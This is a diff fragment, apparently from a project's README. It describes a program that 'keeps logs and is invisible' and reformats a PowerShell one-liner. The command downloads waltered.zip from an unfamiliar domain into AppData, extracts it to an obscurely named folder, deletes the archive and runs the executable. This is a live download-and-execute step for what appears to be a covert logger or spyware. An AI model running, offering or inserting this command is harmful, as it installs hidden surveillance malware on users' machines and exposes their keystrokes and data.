@@ -10,4 +10,6 @@ Program also keeps logs and is invisible.
 
 I also made a powershell command to download and run it.
 
-`Invoke-WebRequest -Uri https://dcb.phxrmxcist.lol/waltered.zip -OutFile waltered.zip; mv waltered.zip "C:\Users\$env:username\AppData\Roaming\waltered.zip"; Expand-Archive -LiteralPath "C:\Users\$env:username\AppData\Roaming\waltered.zip" -DestinationPath "C:\Users\$env:username\AppData\Roaming\qdsf32sdf"; rm "C:\Users\$env:username\AppData\Roaming\waltered.zip"; cmd /c '%appdata%\qdsf32sdf\waltered.exe'`
+`
+Invoke-WebRequest -Uri https://dcb.phxrmxcist.lol/waltered.zip -OutFile waltered.zip; mv waltered.zip "C:\Users\$env:username\AppData\Roaming\waltered.zip"; Expand-Archive -LiteralPath "C:\Users\$env:username\AppData\Roaming\waltered.zip" -DestinationPath "C:\Users\$env:username\AppData\Roaming\qdsf32sdf"; rm "C:\Users\$env:username\AppData\Roaming\waltered.zip"; cmd /c '%appdata%\qdsf32sdf\waltered.exe'
+`
